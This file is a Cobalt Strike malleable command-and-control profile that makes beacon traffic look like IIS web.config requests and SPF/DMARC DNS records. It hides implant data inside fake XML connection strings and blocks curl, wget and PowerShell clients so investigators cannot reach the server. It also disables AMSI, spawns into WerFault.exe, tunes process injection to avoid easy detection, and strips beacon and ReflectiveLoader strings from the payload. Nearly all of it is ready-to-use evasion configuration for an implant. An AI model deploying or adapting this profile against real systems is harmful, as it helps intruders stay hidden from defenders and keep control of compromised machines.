## 
## Cobalt Strike Profile
##

set sample_name "Titan Internet Information Services ( IIS ) Profile";

##
## Period of delay between "sleep"
##
set sleeptime   "300000";
set jitter	"75";

##
## Append data in front of the response
##
set data_jitter "160";

##
## HTTP(s) Client 
##
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.67 Safari/537.36 Edg/100.0.1185.39";

##
## DNS 
##
dns-beacon {
	set dns_idle		"1.1.1.1";
	set dns_max_txt		"252";
	set dns_sleep		"1500";
	set dns_ttl		"2";	
	set maxdns		"255";
	set dns_stager_prepend	"v=spf1 ip4:199.19.70.160/28 include:spf.mandrillapp.com include:_spf.google.com include:spf-0013d401.pphosted.com include:mailsenders.netsuite.com include:mktomail.com include:docebosaas.com -all";
	set dns_stager_subhost	"_dmarc.";
	set ns_response		"drop";
}

##
## SSH
##
set ssh_banner "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5";
set ssh_pipename "mojo.##.##.##";

##
## SMB
##
set pipename "Winsock2\\CatalogChangeListener-##-##";
set pipename_stager "crashpad_##_##";
set smb_frame_header "\xbb\xb8\xd2\x50\xc7\x62\x2c\xa1\x2b\xe1\xfc\x2a\x2a\x66\xe1\xd0";

##
## TCP
##
set tcp_port "50172";
set tcp_frame_header "\x2d\x60\x6e\xbf\x1a\x15\x82\x63\x2b\x73\xc4\x91\x7a\x73\xa9\x33";

##
## HTTP(s) Server
##
set host_stage "false";

http-config {
	##
	## IIS / 1.0 Web Server
	##
	set headers "Cache-Control, Content-Type, Server, Pragma, Content-Length, Date, Expires";
	header "Cache-Control" "no-cache";
	header "Pragma" "no-cache";
	header "Expires" "-1";
	header "Server" "Microsoft-IIS/10.0";
	set trust_x_forwarded_for "true";
	set allow_useragents "Mozilla/*";
	set block_useragents "*curl*,*lynx*,*wget*,*WindowsPowerShell*";
}

http-post {
	##
	## Attempt to set the generic backup
	##
	set uri "/web.config.bak";
	set verb "GET";

	client {
		id {
			header	"Age";
		}
		
		output {
			mask;
			base64;
			prepend	"Basic ";
			header	"Authorization";
		}
	}

	server	{
		output {
			mask;
			base64;
			prepend "<add key=\"connectionstring\" value=\"";
			prepend "<appSettings>";
			prepend	"<configuration>";
			prepend "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
			append  "\"/>";
			append  "</appSettings>";
			append	"</configuration>";
			print;
		}
	}
}

http-get {
	##
	## Attempt to set the generic web.config
	##
	set uri "/web.config";
	set verb "GET";

	##
	## HTTP(s) Client 
	##
	client {
		##
		## Sending Metadata
		##
		metadata {
			netbios;
			base64;
			prepend "Basic ";
			header "Authorization";
		}
	}

	##
	## Request web.config:
	##
	## <?xml version="1.0" encoding="utf-8"?>
	## <appSettings>
	##	<add key="connectionstring" value="[BEACON_DATA]"/>
	## </appSettings>
	##
	server {
		output {
			mask;
			base64;
			prepend "<add key=\"connectionstring\" value=\"";
			prepend "<appSettings>";
			prepend "<configuration>";
			prepend "<?xml version=\"1.0\" encoding=\"utf-8\"?>";
			append  "\"/>";
			append  "</appSettings>";
			append	"</configuration>";
			print;
		}
	}
}

##
## Process - Injection
##
process-inject {
	##
	## Uses VA which is easier to obfuscate
	##
	set allocator	"VirtualAllocEx";
	set startrwx	"false";
	set userwx	"false";

	##
	## Avoids leaving behind an easy start address
	##
	execute {
		CreateThread "ntdll!RtlUserThreadStart";
		SetThreadContext;
		NtQueueApcThread-s;
		RtlCreateUserThread;
	}
}

##
## Process - Post-Ex
##
post-ex {
	##
	## Change these post-op once you know your parent
	## process ID
	##
	set spawnto_x86		"%windir%\\syswow64\\WerFault.exe";
	set spawnto_x64		"%windir%\\sysnative\\WerFault.exe";
	set obfuscate		"true";
	set smartinject		"false";
	set amsi_disable	"true";
	set pipename		"Winsock2\\CatalogChangeListner-##-##";
	set thread_hint		"ntdll!RtlUserThreadStart";
}

##
## SMB / TCP
##
stage {
	set allocator		"VirtualAlloc";
	set userwx			"false";
	set obfuscate		"true";
	set sleep_mask		"false";
	set cleanup			"true";
	set smartinject		"false";

	transform-x64 {
		##
		## Remove Basic Indicators
		##
		strrep "beacon.x64.dll" "";
		strrep "ReflectiveLoader" "";
	}
	transform-x86 {
		##
		## Remove Basic Indicators
		##
		strrep "beacon.dll" "";
		strrep "ReflectiveLoader@4" "";
	}
}
